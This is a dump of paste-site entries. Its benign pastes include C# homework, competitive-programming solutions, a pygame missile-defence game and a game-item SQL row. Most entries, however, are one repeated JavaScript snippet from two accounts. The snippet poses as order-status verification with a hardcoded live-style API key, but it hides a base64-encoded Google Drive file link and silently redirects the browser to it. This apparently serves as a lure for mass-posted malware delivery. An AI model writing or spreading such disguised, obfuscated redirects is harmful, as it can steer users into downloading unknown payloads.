  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
KkskatmN,Untitled,hubertzoo90,JavaScript,Tuesday 25th of March 2025 01:56:20 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/704/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
eTfuXDs2,Untitled,hubertzoo90,JavaScript,Tuesday 25th of March 2025 01:44:17 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/807/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
aBpZneDx,HW 4_3_3,rukvir,C#,Tuesday 25th of March 2025 01:39:39 PM CDT,"using System;

namespace HomeWork
{
    class Program
    {

        static void Main(string[] args)
        {
            const string CommandExitProgramm = ""exit"";
            const string CommandTotalSum = ""sum"";

            string inputUser = """";
            int[] numbers = new int[0];
            int sumNumbers = 0;
            bool isRunning = true;

            while (isRunning)
            {
                Console.WriteLine(""Введите число"");
                inputUser = Console.ReadLine();

                if (inputUser == CommandExitProgramm)
                {
                    isRunning = false;
                }
                else if (inputUser == CommandTotalSum)
                {
                    sumNumbers = 0;

                    for (int i = 0; i < numbers.Length; i++)
                    {
                        sumNumbers += numbers[i];
                    }

                    Console.WriteLine($""Сумма массива = {sumNumbers} "");
                    Console.WriteLine(""-------------------"");
                }
                else if (int.TryParse(inputUser, out int number))
                {
                    int[] newNumbers = new int[numbers.Length + 1];

                    for (int i = 0; i < numbers.Length; i++)
                    {
                        newNumbers[i] = numbers[i];
                    }

                    newNumbers[newNumbers.Length - 1] = number;
                    numbers = newNumbers;
                }
                else
                {
                    Console.WriteLine(""Некоректный ввод! Введите целое число."");
                }

                if (numbers.Length == 0)
                {
                    Console.WriteLine(""\nМассив пустой."");
                }
                else
                {
                    Console.WriteLine(""\nИтоговый массив:"");

                    for (int i = 0; i < numbers.Length; i++)
                    {
                        Console.Write($""{numbers[i]} "");
                    }

                    Console.WriteLine(""\n"");
                }
            }

            Console.ReadKey();
        }
    }
}"
ufNyQKY0,Untitled,hubertzoo90,JavaScript,Tuesday 25th of March 2025 01:20:12 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/588/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
Cj74iqi4,CF1807F,pb_jiang,C++,Tuesday 25th of March 2025 01:14:17 PM CDT,"// Problem: F. Bouncy Ball
// Contest: Codeforces - Codeforces Round 859 (Div. 4)
// URL: https://codeforces.com/problemset/problem/1807/F
// Memory Limit: 256 MB
// Time Limit: 1000 ms
//
// Powered by CP Editor (https://cpeditor.org)

#include <assert.h>
#include <bits/stdc++.h>
using namespace std;
#ifndef __DEBUG__
#define dbg(...) 42
#endif
template <class T> using mpq = priority_queue<T, vector<T>, greater<T>>;

using ll = long long;
using a2l = array<ll, 2>;
using pll = pair<ll, ll>;
using vl = vector<ll>;

ll fpow(ll b, ll p, ll mod)
{
    ll ret = 1, cur = b;
    while (p) {
        if (p % 2)
            ret = ret * cur % mod;
        cur = cur * cur % mod;
        p /= 2;
    }
    return ret;
}

void solve_overcomplicated()
{
    ll n, m, i1, j1, i2, j2, ans = LLONG_MAX / 2;
    string d;
    cin >> n >> m >> i1 >> j1 >> i2 >> j2 >> d;
    ll g = gcd(n, m), dx = d[0] == 'D' ? 1 : -1, dy = d[1] == 'L' ? -1 : 1;

    auto find_flip = [&](ll fx, ll fy) {
        ll tx = fx ? n + 1 - i2 : i2;
        ll ty = fy ? m + 1 - j2 : j2;
        ll tg = ((i1 - tx) * dy - (j1 - ty) * dy) / dx / dy;
        if (tg % g != 0)
            return LLONG_MAX;
        ll fn = n / g, fm = m / g, ft = tg / g;
        ll a = ft * fpow(fn, fm - 2, fm) % fm;
        ll b = (a * fn - ft) / fm;
        if (a < 0) {
            ll d = (-a + fm - 1) / fm;
            a += d * fm, b += d * fn;
        }
        if (b < 0) {
            ll d = (-b + fn - 1) / fn;
            a += d * fm, b += d * fn;
        }
        if (a % 2 != fx || b % 2 != fy)
            return LLONG_MAX;

        ll fix = 0;
        return a + b - fix;
    };

    ans = min(ans, find_flip(0, 0));
    ans = min(ans, find_flip(0, 1));
    ans = min(ans, find_flip(1, 0));
    ans = min(ans, find_flip(1, 1));
    cout << (ans == LLONG_MAX / 2 ? -1 : ans) << '\n';
}

void solve()
{
    ll n, m, i1, j1, i2, j2;
    string d;
    cin >> n >> m >> i1 >> j1 >> i2 >> j2 >> d;
    ll dx = d[0] == 'D' ? 1 : -1, dy = d[1] == 'L' ? -1 : 1;
    using a4l = array<ll, 4>;
    set<a4l> vis;
    bool valid = true;
    ll bcnt = 0, x = i1, y = j1;
    vis.insert({x, y, dx, dy});
    while (true) {
        if (x == i2 && y == j2)
            break;
        ll nx = x + dx, ny = y + dy;
        ll bx = (nx == 0) || (nx == n + 1);
        ll by = (ny == 0) || (ny == m + 1);
        dbg(x, y, bx, by);
        if (bx)
            ++bcnt, dx = -dx;
        if (by)
            ++bcnt, dy = -dy;
        bcnt -= bx && by;

        x += dx, y += dy;
        if (x == i2 && y == j2)
            break;
        if (vis.count({x, y, dx, dy})) {
            dbg(x, y, dx, dy);
            valid = false;
            break;
        }
        vis.insert({x, y, dx, dy});
    }
    cout << (valid ? bcnt : -1) << '\n';
}

int main(int argc, char **argv)
{
    ll t;
    cin >> t;
    while (t--)
        solve();
    return 0;
};
"
eGjvhsqV,Untitled,hubertzoo90,JavaScript,Tuesday 25th of March 2025 01:08:10 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/703/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
Ye3T9Nhc,Untitled,hubertzoo90,JavaScript,Tuesday 25th of March 2025 12:56:05 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/552/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
Tdt2zYqj,Untitled,hubertzoo90,JavaScript,Tuesday 25th of March 2025 12:43:40 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/235/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
ZJ4cF59a,Untitled,hubertzoo90,JavaScript,Tuesday 25th of March 2025 12:31:38 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/913/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
yRChxepW,成绩统计 参考代码,Dmaxiya,C++,Tuesday 25th of March 2025 12:24:06 PM CDT,"#include <bits/stdc++.h>
using namespace std;

typedef long long LL;
const int maxn = 100000 + 100;
int n, k;
LL T;
LL num[maxn], sum[maxn], tmp[maxn], sum2[maxn];

bool judge(int n) {
    memcpy(tmp, num, sizeof(num));
    sort(tmp + 1, tmp + 1 + n);
    for (int i = 1; i <= n; ++i) {
        sum[i] = sum[i - 1] + tmp[i];
        sum2[i] = sum2[i - 1] + tmp[i] * tmp[i];
    }
    double mn = 1e100;
    for (int i = k; i <= n; ++i) {
        double avg = (sum[i] - sum[i - k]) / k;
        mn = min(mn, sum2[i] - sum2[i - k] - 2 * avg * (sum[i] - sum[i - k]) + k * avg * avg);
    }
    return mn / k <= T;
}

int main() {
#ifdef ExRoc
    freopen(""test.txt"", ""r"", stdin);
#endif
    ios::sync_with_stdio(false);

    cin >> n >> k >> T;
    if (n < k) {
        cout << -1 << endl;
        return 0;
    }
    for (int i = 1; i <= n; ++i) {
        cin >> num[i];
    }
    int low = k - 1;
    int high = n + 1;
    int mid;
    while (high - low > 1) {
        mid = (high + low) >> 1;
        if (judge(mid)) {
            high = mid;
        } else {
            low = mid;
        }
    }
    cout << (high == n + 1 ? -1 : high) << endl;

    return 0;
}
"
pmLGuVps,Untitled,hubertzoo90,JavaScript,Tuesday 25th of March 2025 12:19:35 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/525/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
W6ikiK5p,Missile Defence,CatNamedWill,Python,Tuesday 25th of March 2025 12:11:32 PM CDT,"import pygame
import random
import math

# Initialize PyGame
pygame.init()

# Screen dimensions
WIDTH, HEIGHT = 800, 600
WIN = pygame.display.set_mode((WIDTH, HEIGHT))
pygame.display.set_caption(""Mutual Assured Destruction"")

# Colors
WHITE = (255, 255, 255)
BLACK = (0,0,0)
RED = (255, 0, 0)
BLUE = (0, 0, 255)
GREEN = (0, 255, 0)
YELLOW = (255, 255, 0)

# Game variables
FPS = 60
MISSILE_EVENT = pygame.USEREVENT + 1
pygame.time.set_timer(MISSILE_EVENT, 1000)  # Spawn a missile every second
CITY_COUNT = 12

# Font
FONT = pygame.font.SysFont('arial', 20)

class Missile:
    def __init__(self):
        self.x = random.randint(0, WIDTH)
        self.y = 0
        self.target_x = random.randint(50, WIDTH - 50)
        self.target_y = HEIGHT - 50
        self.speed = random.uniform(3, 7)
        self.angle = math.atan2(self.target_y - self.y, self.target_x - self.x)
        self.dx = math.cos(self.angle) * self.speed
        self.dy = math.sin(self.angle) * self.speed

    def move(self):
        self.x += self.dx
        self.y += self.dy

    def draw(self, win):
        pygame.draw.circle(win, RED, (int(self.x), int(self.y)), 3)

class Interceptor:
    def __init__(self, x, y):
        self.x = WIDTH / 2
        self.y = HEIGHT - 50
        self.target_x = x
        self.target_y = y
        self.speed = 5
        self.angle = math.atan2(self.target_y - self.y, self.target_x - self.x)
        self.dx = math.cos(self.angle) * self.speed
        self.dy = math.sin(self.angle) * self.speed
        self.exploded = False
        self.explosion_max_radius = 50
        self.explosion_duration = 30  # frames
        self.explosion_timer = 0

    def move(self):
        if not self.exploded:
            # Move towards target
            self.x += self.dx
            self.y += self.dy
            # Check if reached target
            distance_to_target = math.hypot(self.x - self.target_x, self.y - self.target_y)
            if distance_to_target <= self.speed:
                self.exploded = True
                self.explosion_timer = 0
        else:
            # Explosion timer
            self.explosion_timer += 1

    def draw(self, win):
        if not self.exploded:
            pygame.draw.circle(win, BLUE, (int(self.x), int(self.y)), 3)
        else:
            # Explosion radius increases over time
            current_radius = (self.explosion_timer / self.explosion_duration) * self.explosion_max_radius
            pygame.draw.circle(win, YELLOW, (int(self.x), int(self.y)), int(current_radius))

class City:
    def __init__(self, x):
        self.x = x
        self.y = HEIGHT - 20
        self.alive = True

    def draw(self, win):
        if self.alive:
            pygame.draw.rect(win, GREEN, (self.x - 20, self.y, 40, 20))

def main():
    run = True
    clock = pygame.time.Clock()
    missiles = []
    interceptors = []
    cities = [City(WIDTH * i / CITY_COUNT + WIDTH / (2 * CITY_COUNT)) for i in range(CITY_COUNT)]
    score = 0

    while run:
        clock.tick(FPS)
        WIN.fill(BLACK)

        # Event handling
        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                run = False
            elif event.type == MISSILE_EVENT:
                missiles.append(Missile())
            elif event.type == pygame.MOUSEBUTTONDOWN:
                x, y = pygame.mouse.get_pos()
                interceptors.append(Interceptor(x, y))

        # Move and draw missiles
        for missile in missiles[:]:
            missile.move()
            missile.draw(WIN)
            # Check for collision with cities
            for city in cities:
                if city.alive and math.hypot(missile.x - city.x, missile.y - city.y) < 10:
                    city.alive = False
                    missiles.remove(missile)
                    break
            else:
                # Check if missile reached the ground
                if missile.y >= HEIGHT:
                    missiles.remove(missile)

        # Move and draw interceptors
        for interceptor in interceptors[:]:
            interceptor.move()
            interceptor.draw(WIN)
            if interceptor.exploded:
                # Current explosion radius
                current_radius = (interceptor.explosion_timer / interceptor.explosion_duration) * interceptor.explosion_max_radius
                # Check for missiles within current explosion radius
                for missile in missiles[:]:
                    distance = math.hypot(interceptor.x - missile.x, interceptor.y - missile.y)
                    if distance <= current_radius:
                        try:
                            missiles.remove(missile)
                            score += 100
                        except ValueError:
                            pass
                # Remove interceptor if explosion is over
                if interceptor.explosion_timer >= interceptor.explosion_duration:
                    interceptors.remove(interceptor)
            else:
                # Remove interceptor if it goes off screen
                if interceptor.y <= 0 or interceptor.x < 0 or interceptor.x > WIDTH:
                    interceptors.remove(interceptor)

        # Draw cities
        for city in cities:
            city.draw(WIN)

        # Draw score
        score_text = FONT.render(f""Score: {score}"", True, WHITE)
        WIN.blit(score_text, (10, 10))

        # Check for game over
        if not any(city.alive for city in cities):
            game_over_text = FONT.render(""Game Over"", True, RED)
            WIN.blit(game_over_text, (WIDTH / 2 - 50, HEIGHT / 2))
            pygame.display.update()
            pygame.time.delay(3000)
            run = False

        pygame.display.update()

    pygame.quit()

if __name__ == ""__main__"":
    main()
"
s0rSgRzq,Untitled,hubertzoo90,JavaScript,Tuesday 25th of March 2025 12:07:32 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/139/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
KT7eWp8U,Untitled,hubertzoo90,JavaScript,Tuesday 25th of March 2025 11:55:27 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/670/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
uSJMYCpX,Untitled,jm33,JavaScript,Tuesday 25th of March 2025 11:43:02 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/886/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
Wrtr8tus,Untitled,jm33,JavaScript,Tuesday 25th of March 2025 11:30:44 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/241/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
aDbf9T2z,petle1,Cassimus,C#,Tuesday 25th of March 2025 11:19:57 AM CDT,"#region zad1
// System.Console.WriteLine(""Podaj liczbę calkowitą: "");
// int liczba = int.Parse(Console.ReadLine());
// System.Console.WriteLine(""Ile razy mam dodać 5?"");
// int licznik = int.Parse(Console.ReadLine());

// int suma = liczba;

// for(int i = 0; i < licznik; i++  )
// {
//     suma += 5;
//     System.Console.WriteLine($""{i+1}. Po dodaniu 5 {i+1} raz: {suma}"");
// }

// DRY - Don't Repeate Yourself 
#endregion"
AgtzJXq9,Untitled,jm33,JavaScript,Tuesday 25th of March 2025 11:18:41 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/861/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
k0KjsMzv,Untitled,Sansuall,MySQL,Tuesday 25th of March 2025 11:14:45 AM CDT,"| entry  | InventoryType | AllowableClass | AllowableRace | ItemLevel | subclass | name                                | name_loc8                                                       | class | itemset | tooltip                                                                                                                                                                                                                       | tooltip_loc8                                                                                                                                                                                                                                                                                                                                                         |

| 300104 |             0 |             -1 |            -1 |        30 |        5 | Uldir Mythic (385-395 ilvl + other) | Ульдир Мифический (385-395 илвл + допы)                         |    22 |       0 | Upon purchase, you will receive one item 385-395 iLvl, from 1000 to 7000 gold, from 500 to 2500 XP for the Heart of Azeroth, as well as reputation with some factions (each category has its own percentage of random drops). | При приобретении вы получаете одну вещь 385-395 ilvl, от 1000 до 7000 золота, от 500 до 2500 ед.опыта Сердца Азерот, а также репутацию с некоторыми фракциями (каждая категория имеет свой % случайного выпадения).
"
32kPG2dd,Untitled,jm33,JavaScript,Tuesday 25th of March 2025 11:06:38 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/632/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

